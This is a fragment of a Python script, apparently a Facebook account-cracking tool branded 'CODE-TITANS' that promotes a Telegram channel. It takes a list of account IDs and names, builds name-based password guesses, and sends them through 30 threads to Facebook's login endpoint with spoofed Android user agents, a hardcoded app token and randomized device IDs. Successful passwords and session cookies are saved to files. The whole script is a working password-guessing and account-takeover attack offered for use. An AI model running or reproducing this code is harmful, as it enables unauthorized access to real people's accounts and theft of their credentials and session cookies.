"[FBAN/FB4A;FBAV/136.0.0.22.91;FBBV/67437982;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/67437982;FBCR/Sunrise;FBMF/TP-LINK;FBBD/Neffos;FBPN/com.facebook.katana;FBDV/Neffos C5 Max;FBSV/5.1;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/162.0.0.42.94;FBBV/95494658;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/95494658;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/162.0.0.45.94;FBBV/95632808;FBDM/{density=2.55,width=1080,height=1798};FBLC/fr_FR;FBRV/95632808;FBCR/Swisscom;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G3221;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/163.0.0.43.91;FBBV/96845997;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/96845997;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/224.0.0.33.114;FBBV/157411939;FBDM/{density=1.5,width=480,height=888};FBLC/es_LA;FBRV/158579294;FBCR/AT&amp-T_4G;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto_e5_play;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
"[FBAV/201.0.0.12.99;FBPN/com.facebook.orca;FBLC/en_US;FBBV/140791729;FBCR/Sprint;FBMF/Yulong;FBBD/Coolpad;FBDV/Coolpad 3310A;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=854};FB_FW/1;]",

]

def ugenx():
        dalvik = random.choice(dalda)
        end = random.choice(ends)
        ua = dalvik + end
        return ua

def clear():
   os.system('xdg-open https://t.me/codetitansoffc')
   os.system('clear')
   bannera()


def lin3():
   print(f'{G}──────────────────────────────────────────')
def exit():
  sys.exit()

def main_menu():
    os.system('xdg-open https://t.me/codetitansoffc')
    os.system("clear")
    bannera()
    print(f"{oo(1)}File Cloning ")   
    print(f"{oo(0)}Exit")
    print(f'{G}──────────────────────────────────────────')
    cp =input('[?] Choice : ')
    if cp=="1":os.system('xdg-open https://t.me/codetitansoffc');file()
    if cp == "0":
     exit()
    main_menu()
     
def file():
    os.system("clear")
    bannera()
    file = input(f"{oo('-')}Enter File:\u001b[1;91m ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        main_menu() 
    method()
    exit()

def method():
    clear()
    
    lp = input(f'{oo("?")}Limit Passwords? :\u001b[1;91m ');lin3()
    if lp.isnumeric():
        pp=[]
        clear()
        print('\u001b[1;91mfirstlast first123 last123 708090')
        print(f'{G}──────────────────────────────────────────')
        for x in range(int(lp)):
           pp.append(input(f'Password {oo(x+1)} : '))
    else:
       print(f"{oo('!')}Numeric Only");time.sleep(0.8)
       main_menu()
    clear() 
    print('\033[1;97m[+] Total Accounts For CraCk : \033[1;32m '+str(len(idx)))
    lin3()
    def start(user):
     try:
        global loop,idx,cll
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(idx)) * 100)[:4]
        sys.stdout.write(f'\r {loop}।OK:{len(oku)}\u001b[1;97m\r')
        sys.stdout.flush()
        loop+=1
        for pswd in pp:
              hea66ds="Dalvik/1.6.0_(Linux;_U;_Android_4.4.2;_7040N_Build/KVT49L)_[FBAN/Orca-Android;FBAV/18.0.0.27.14;FBLC/en_US;FBBV/5791144;FBCR/MetroPCS;FBMF/TCL;FBBD/TCL_MetroPCS;FBDV/7040N;FBSV/4.4.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1"#Put Your user Agent Here
              sim_hni = str(random.randint(10000, 99999))
              device_id = str(uuid.uuid4())
              adid = str(uuid.uuid4())
              pswd = pswd.replace(f'first',first.lower()).replace(f'First',first).replace(f'last',last.lower()).replace(f'Last',last).replace(f'Name',name).replace(f'name',name.lower())
              header = header = {"User-Agent": ugenx(),
    "Content-Type": "application/x-www-form-accencoded",
    "Host": "graph.facebook.com",
    "X-FB-Net-HNI": f"{sim_hni}",
    "X-FB-SIM-HNI": f"{sim_hni}",
    "X-FB-Connection-Type": "unknown",
    "X-Tigon-Is-Retry": "False",
    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
    "x-fb-device-group": "5120",
    "X-FB-Friendly-Name": "authenticate",
    "X-FB-Request-Analytics-Tags": "graphservice",
    "Accept-Encoding": "gzip, deflate",
    "X-FB-HTTP-Engine": "Liger",
    "X-FB-Client-IP": "True",
    "X-FB-Server-Cluster": "True",
    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
    "Connection": "Keep-Alive",
              }

              data={
    "adid": str(uuid.uuid4()),
    "format": "json",
    "device_id": str(uuid.uuid4()),
    "cpl": "true",
    "family_device_id": str(uuid.uuid4()),
    "credentials_type": "device_based_login_password",
    "error_detail_type": "button_with_disabled",
    "source": "device_based_login",
    "email": acc,
    "password": pswd,
    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    "generate_session_cookies": "1",
    "meta_inf_fbmeta": "",
    "advertiser_id": str(uuid.uuid4()),
    "currently_logged_in_userid": "0",
    "locale": "en_US",
    "client_country_code": "US",
    "method": "auth.login",
    "fb_api_req_friendly_name": "authenticate",
    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
    "api_key": "882a8490361da98702bf97a021ddc14d",
              }

              response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False).text
              if "session_key" in response:
                 oku.append(acc)
                 cookie=f"sb={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(response)["session_cookies"])
                 print(f'\r\r{W}[TITANS-OK] {G}'+acc+' | '+pswd)
                 os.system('espeak -a 800 " Indian account hack Done"')
                 open('/sdcard/CODE-TITANS/OK-uidpasscookie.txt','a').write(f'{acc}|{pswd}|{cookie}\n')
                 open('/sdcard/CODE-TITANS/OK-uidpass.txt','a').write(f'{acc}|{pswd}\n')
                 break
              elif "User must verify their account" in response:
                cpu.append(acc)
                #print(f'\r\r{R}[TITANS-CP] {R}'+acc+' | '+pswd)
                open('/sdcard/CODE-TITANS/CP.txt','a').write(f'{acc}|{pswd}\n')
                break
              else:
                   continue   
     except Exception as e:
       time.sleep(10)
    with tpe(max_workers=30) as tp:
            tp.map(start,idx)
    exit()    


def seassion():
        session_name = "CODE<>TITANS"
        os.system(f'echo -e "\033]0;{session_name}\007"')

system('clear');print('For daily update\nJoin Over Our Telegram Channel');time.sleep(2)
os.system('xdg-open https://t.me/codetitansoffc');time.sleep(2)


es();seassion();main_menu()
